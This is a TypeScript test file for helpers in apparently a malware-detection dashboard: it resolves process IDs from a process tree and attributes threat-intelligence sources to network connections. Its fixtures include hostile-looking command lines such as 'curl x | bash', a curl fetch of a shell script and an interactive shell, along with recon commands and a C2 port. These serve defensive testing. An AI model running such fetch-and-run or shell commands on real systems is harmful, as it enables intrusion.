// Run-detail pure helpers:
//  - resolvePids — the recon-actor resolution: walk the process tree, keep
//    only the requested pids, preserve alert order, skip missing pids.
//  - connectionSources — reputation source attribution for a connection.

import { describe, expect, it } from "vitest";
import { connectionSources, resolvePids } from "../routes/runDetailHelpers";
import type { NetworkConnection, ProcessNode, RunDetail } from "../types";

function node(over: Partial<ProcessNode>): ProcessNode {
  return { pid: 0, ppid: null, process_name: "unknown", command_line: null, children: [], ...over };
}

const tree: RunDetail["process_tree"] = [
  node({ pid: 3000, process_name: "bash", command_line: "/tmp/bash -i", children: [
    node({ pid: 3001, process_name: "sh", command_line: "sh -c 'curl x | bash'", children: [
      node({ pid: 3002, process_name: "curl", command_line: "curl -s http://x/x.sh" }),
    ]}),
  ]}),
  node({ pid: 3003, process_name: "whoami", command_line: "whoami" }),
  node({ pid: 3004, process_name: "uname", command_line: "uname -a" }),
  node({ pid: 3005, process_name: "getent", command_line: "getent passwd" }),
];

describe("resolvePids", () => {
  it("walks the full tree and returns every requested pid with its metadata", () => {
    const out = resolvePids(tree, [3000, 3001, 3002]);
    expect([...out.keys()]).toEqual([3000, 3001, 3002]);
    expect(out.get(3002)).toEqual({ pid: 3002, process_name: "curl", command_line: "curl -s http://x/x.sh" });
  });

  it("preserves the requested order (alert order), not tree order", () => {
    const out = resolvePids(tree, [3004, 3000, 3005]);
    expect([...out.keys()]).toEqual([3004, 3000, 3005]);
  });

  it("skips pids that are not in the tree", () => {
    const out = resolvePids(tree, [3000, 9999, 3003]);
    expect([...out.keys()]).toEqual([3000, 3003]);
  });

  it("returns an empty map when no requested pid is in the tree", () => {
    const out = resolvePids(tree, [42]);
    expect(out.size).toBe(0);
  });

  it("dedupes repeated pids", () => {
    const out = resolvePids(tree, [3003, 3003, 3003]);
    expect([...out.keys()]).toEqual([3003]);
  });

  it("handles an empty tree", () => {
    expect(resolvePids([], [3000]).size).toBe(0);
  });
});

describe("connectionSources", () => {
  const base: NetworkConnection = {
    dest_ip: "203.0.113.88",
    dest_port: 4444,
    protocol: "TCP",
    first_seen: "2026-08-14T11:15:18Z",
    reputation: "malicious",
    abuse_score: null,
    vt_malicious_count: null,
    malware_family: null,
    watchlist: false,
    watchlist_label: null,
    checked_at: null,
  };

  it("names the personal watchlist when the connection is watchlisted", () => {
    expect(connectionSources({ ...base, watchlist: true, watchlist_label: "known C2" })).toEqual([
      "personal watchlist (known C2)",
    ]);
  });

  it("includes the AbuseIPDB score when present", () => {
    expect(connectionSources({ ...base, abuse_score: 87 })).toEqual(["AbuseIPDB score 87"]);
  });

  it("includes the VirusTotal vendor count (singular)", () => {
    expect(connectionSources({ ...base, vt_malicious_count: 1 })).toEqual(["VirusTotal: 1 malicious vendor"]);
  });

  it("pluralizes the VirusTotal vendor count", () => {
    expect(connectionSources({ ...base, vt_malicious_count: 64 })).toEqual(["VirusTotal: 64 malicious vendors"]);
  });

  it("combines all sources in attribution order", () => {
    expect(connectionSources({ ...base, watchlist: true, abuse_score: 87, vt_malicious_count: 64 })).toEqual([
      "personal watchlist",
      "AbuseIPDB score 87",
      "VirusTotal: 64 malicious vendors",
    ]);
  });

  it("says no intel is configured when every source is absent", () => {
    expect(connectionSources(base)).toEqual(["no external intel configured"]);
  });
});
